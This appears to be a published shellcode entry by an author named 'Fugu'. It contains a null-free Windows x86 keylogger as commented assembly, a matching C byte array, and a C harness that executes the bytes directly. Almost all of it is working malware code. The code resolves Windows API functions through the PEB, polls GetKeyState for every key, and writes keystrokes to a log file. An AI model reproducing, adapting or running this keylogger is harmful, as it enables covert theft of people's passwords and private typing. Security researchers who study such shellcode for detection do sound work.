/*
; Exploit Title: All windows null free shellcode - primitave keylogger to file - 431 (0x01AF) bytes
; Date: Sat Apr 23 18:34:25 GMT 2016
; Exploit Author: Fugu
; Vendor Homepage: www.microsoft.com
; Version: all afaik
; Tested on: Win7 (im guessing it will work on others)
; Note: it will write to "log.bin" in the same directory as the exe, iff that DIR is writable.
;       it is kinda spammy to the logfile, and will grow quickly. keystrokes are saved in format:
;       "Virtual-Key Codes", from msdn.microsoft.com website

section .bss

section .data

section .text
   global _start
      _start:
    cld  								; 00000000 FC
    xor edx,edx  							; 00000001 31D2
    mov dl,0x30  							; 00000003 B230
    push dword [fs:edx]  						; 00000005 64FF32
    pop edx  								; 00000008 5A
    mov edx,[edx+0xc]  							; 00000009 8B520C
    mov edx,[edx+0x14]  						; 0000000C 8B5214
loc_fh:
    mov esi,[edx+0x28]  						; 0000000F 8B7228
    xor eax,eax  							; 00000012 31C0
    mov ecx,eax  							; 00000014 89C1
    mov cl,0x3  							; 00000016 B103
loc_18h:
    lodsb  								; 00000018 AC
    rol eax,byte 0x8  							; 00000019 C1C008
    lodsb  								; 0000001C AC
    loop loc_18h  							; 0000001D E2F9
    lodsb  								; 0000001F AC
    cmp eax,0x4b45524e  						; 00000020 3D4E52454B
    jz loc_2ch  							; 00000025 7405
    cmp eax,0x6b65726e  						; 00000027 3D6E72656B
loc_2ch:
    mov ebx,[edx+0x10]  						; 0000002C 8B5A10
    mov edx,[edx]  							; 0000002F 8B12
    jnz loc_fh  							; 00000031 75DC
    mov edx,[ebx+0x3c]  						; 00000033 8B533C
    add edx,ebx  							; 00000036 01DA
    push dword [edx+0x34]  						; 00000038 FF7234
    mov edx,[edx+0x78]  						; 0000003B 8B5278
    add edx,ebx  							; 0000003E 01DA
    mov esi,[edx+0x20]  						; 00000040 8B7220
    add esi,ebx  							; 00000043 01DE

;GetProcAddress
    xor ecx,ecx  							; 00000045 31C9
loc_47h:
    inc ecx  								; 00000047 41
    lodsd  								; 00000048 AD
    add eax,ebx  							; 00000049 01D8
    cmp dword [eax],0x50746547  					; 0000004B 813847657450
    jnz loc_47h  							; 00000051 75F4
    cmp dword [eax+0x4],0x41636f72  					; 00000053 817804726F6341
    jnz loc_47h  							; 0000005A 75EB
    cmp dword [eax+0x8],0x65726464  					; 0000005C 81780864647265
    jnz loc_47h  							; 00000063 75E2
    dec ecx  								; 00000065 49
    mov esi,[edx+0x24]  						; 00000066 8B7224
    add esi,ebx  							; 00000069 01DE
    mov cx,[esi+ecx*2]  						; 0000006B 668B0C4E
    mov esi,[edx+0x1c]  						; 0000006F 8B721C
    add esi,ebx  							; 00000072 01DE
    mov edx,[esi+ecx*4]  						; 00000074 8B148E
    add edx,ebx  							; 00000077 01DA
    mov edi,edx  							; 00000079 89D7
    push edx  								; 0000007B 52

;GetModuleHandleA
    xor eax,eax  							; 0000007C 31C0
    push eax  								; 0000007E 50
    push dword 0x41656c64  						; 0000007F 68646C6541
    push dword 0x6e614865  						; 00000084 686548616E
    push dword 0x6c75646f  						; 00000089 686F64756C
    push dword 0x4d746547  						; 0000008E 684765744D
    push esp  								; 00000093 54
    push ebx  								; 00000094 53
    call edi  								; 00000095 FFD7
    lea esp,[esp+0x14]  						; 00000097 8D642414
    push eax  								; 0000009B 50

;GetModuleHandleA("USER32.DLL")
    push dword 0x88014c4c  						; 0000009C 684C4C0188
    dec byte [esp+0x2]  						; 000000A1 FE4C2402
    push dword 0x442e3233  						; 000000A5 6833322E44
    push dword 0x52455355  						; 000000AA 6855534552
    push esp  								; 000000AF 54
    call eax  								; 000000B0 FFD0
    xor edx,edx  							; 000000B2 31D2
    cmp eax,edx  							; 000000B4 39D0
    jnz loc_f0h  							; 000000B6 7538
    lea esp,[esp+0xc]  							; 000000B8 8D64240C

;LoadLibraryA
    push edx  								; 000000BC 52
    push dword 0x41797261  						; 000000BD 6861727941
    push dword 0x7262694c  						; 000000C2 684C696272
    push dword 0x64616f4c  						; 000000C7 684C6F6164
    push esp  								; 000000CC 54
    push ebx  								; 000000CD 53
    call edi  								; 000000CE FFD7
    lea esp,[esp+0x10]  						; 000000D0 8D642410
    push eax  								; 000000D4 50

;LoadLibraryA("USER32.DLL")
    push dword 0x77014c4c  						; 000000D5 684C4C0177
    dec byte [esp+0x2]  						; 000000DA FE4C2402
    push dword 0x442e3233  						; 000000DE 6833322E44
    push dword 0x52455355  						; 000000E3 6855534552
    push esp  								; 000000E8 54
    call eax  								; 000000E9 FFD0
    lea esp,[esp+0xc]  							; 000000EB 8D64240C
    push eax  								; 000000EF 50

;GetKeyState
loc_f0h:
    mov edx,eax  							; 000000F0 89C2
    push dword 0x1657461  						; 000000F2 6861746501
    dec byte [esp+0x3]  						; 000000F7 FE4C2403
    push dword 0x74537965  						; 000000FB 6865795374
    push dword 0x4b746547  						; 00000100 684765744B
    push esp  								; 00000105 54
    push edx  								; 00000106 52
    call edi  								; 00000107 FFD7
    lea esp,[esp+0xc]  							; 00000109 8D64240C
    push eax  								; 0000010D 50

;WriteFile
    push dword 0x55010165  						; 0000010E 6865010155
    dec byte [esp+0x1]  						; 00000113 FE4C2401
    push dword 0x6c694665  						; 00000117 686546696C
    push dword 0x74697257  						; 0000011C 6857726974
    push esp  								; 00000121 54
    push ebx  								; 00000122 53
    call edi  								; 00000123 FFD7
    lea esp,[esp+0xc]  							; 00000125 8D64240C
    push eax  								; 00000129 50

;CreateFileA
    push dword 0x141656c  						; 0000012A 686C654101
    dec byte [esp+0x3]  						; 0000012F FE4C2403
    push dword 0x69466574  						; 00000133 6874654669
    push dword 0x61657243  						; 00000138 6843726561
    push esp  								; 0000013D 54
    push ebx  								; 0000013E 53
    call edi  								; 0000013F FFD7
    lea esp,[esp+0xc]  							; 00000141 8D64240C
    push eax  								; 00000145 50

    push dword 0x16e6962  						; 00000146 6862696E01
    dec byte [esp+0x3]  						; 0000014B FE4C2403
    push dword 0x2e676f6c  						; 0000014F 686C6F672E

    xor ecx,ecx  							; 00000154 31C9
    push ecx  								; 00000156 51
    push ecx  								; 00000157 51
    add byte [esp],0x80  						; 00000158 80042480
    push byte +0x4  							; 0000015C 6A04
    push ecx  								; 0000015E 51
    push byte +0x2  							; 0000015F 6A02
    push ecx  								; 00000161 51
    add byte [esp],0x4  						; 00000162 80042404
    lea ecx,[esp+0x18]  						; 00000166 8D4C2418
    push ecx  								; 0000016A 51
    call eax  								; 0000016B FFD0
    lea esp,[esp+0x8]  							; 0000016D 8D642408
    push eax  								; 00000171 50

;main loop
loc_172h:
    xor ecx,ecx  							; 00000172 31C9
    xor esi,esi  							; 00000174 31F6
loc_176h:
    mov cl,0xff  							; 00000176 B1FF
    mov eax,esi  							; 00000178 89F0
    cmp al,cl  								; 0000017A 38C8
    jc loc_180h  							; 0000017C 7202
    xor esi,esi  							; 0000017E 31F6
loc_180h:
    inc esi  								; 00000180 46
    push esi  								; 00000181 56
    call dword [esp+0x10]  						; 00000182 FF542410
    mov edx,esi  							; 00000186 89F2
    xor ecx,ecx  							; 00000188 31C9
    mov cl,0x80  							; 0000018A B180
    and eax,ecx  							; 0000018C 21C8
    xor ecx,ecx  							; 0000018E 31C9
    cmp eax,ecx  							; 00000190 39C8
    jz loc_176h  							; 00000192 74E2

    push edx  								; 00000194 52
    push ecx  								; 00000195 51
    lea ecx,[esp]  							; 00000196 8D0C24
    push ecx  								; 00000199 51
    push byte +0x1  							; 0000019A 6A01
    lea ecx,[esp+0xc]  							; 0000019C 8D4C240C
    push ecx  								; 000001A0 51
    push dword [esp+0x14]  						; 000001A1 FF742414
    call dword [esp+0x20]  						; 000001A5 FF542420
    lea esp,[esp+0x4]  							; 000001A9 8D642404
    jmp short loc_172h  						; 000001AD EBC3
*/
#include <stdio.h>
#include <string.h>

unsigned char sc[] = "\xfc\x31\xd2\xb2\x30\x64\xff\x32\x5a\x8b\x52\x0c\x8b\x52\x14\x8b"
		"\x72\x28\x31\xc0\x89\xc1\xb1\x03\xac\xc1\xc0\x08\xac\xe2\xf9\xac"
		"\x3d\x4e\x52\x45\x4b\x74\x05\x3d\x6e\x72\x65\x6b\x8b\x5a\x10\x8b"
		"\x12\x75\xdc\x8b\x53\x3c\x01\xda\xff\x72\x34\x8b\x52\x78\x01\xda"
		"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74"
		"\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64"
		"\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b"
		"\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd7\x52\x31\xc0\x50\x68"
		"\x64\x6c\x65\x41\x68\x65\x48\x61\x6e\x68\x6f\x64\x75\x6c\x68\x47"
		"\x65\x74\x4d\x54\x53\xff\xd7\x8d\x64\x24\x14\x50\x68\x4c\x4c\x01"
		"\x88\xfe\x4c\x24\x02\x68\x33\x32\x2e\x44\x68\x55\x53\x45\x52\x54"
		"\xff\xd0\x31\xd2\x39\xd0\x75\x38\x8d\x64\x24\x0c\x52\x68\x61\x72"
		"\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd7"
		"\x8d\x64\x24\x10\x50\x68\x4c\x4c\x01\x77\xfe\x4c\x24\x02\x68\x33"
		"\x32\x2e\x44\x68\x55\x53\x45\x52\x54\xff\xd0\x8d\x64\x24\x0c\x50"
		"\x89\xc2\x68\x61\x74\x65\x01\xfe\x4c\x24\x03\x68\x65\x79\x53\x74"
		"\x68\x47\x65\x74\x4b\x54\x52\xff\xd7\x8d\x64\x24\x0c\x50\x68\x65"
		"\x01\x01\x55\xfe\x4c\x24\x01\x68\x65\x46\x69\x6c\x68\x57\x72\x69"
		"\x74\x54\x53\xff\xd7\x8d\x64\x24\x0c\x50\x68\x6c\x65\x41\x01\xfe"
		"\x4c\x24\x03\x68\x74\x65\x46\x69\x68\x43\x72\x65\x61\x54\x53\xff"
		"\xd7\x8d\x64\x24\x0c\x50\x68\x62\x69\x6e\x01\xfe\x4c\x24\x03\x68"
		"\x6c\x6f\x67\x2e\x31\xc9\x51\x51\x80\x04\x24\x80\x6a\x04\x51\x6a"
		"\x02\x51\x80\x04\x24\x04\x8d\x4c\x24\x18\x51\xff\xd0\x8d\x64\x24"
		"\x08\x50\x31\xc9\x31\xf6\xb1\xff\x89\xf0\x38\xc8\x72\x02\x31\xf6"
		"\x46\x56\xff\x54\x24\x10\x89\xf2\x31\xc9\xb1\x80\x21\xc8\x31\xc9"
		"\x39\xc8\x74\xe2\x52\x51\x8d\x0c\x24\x51\x6a\x01\x8d\x4c\x24\x0c"
		"\x51\xff\x74\x24\x14\xff\x54\x24\x20\x8d\x64\x24\x04\xeb\xc3";


int main(int argc, char *argv[]){
	printf("Shellcode length: %d\n", (int)strlen(sc));
	(*(void(*)(void))&sc)();
	return 0;
}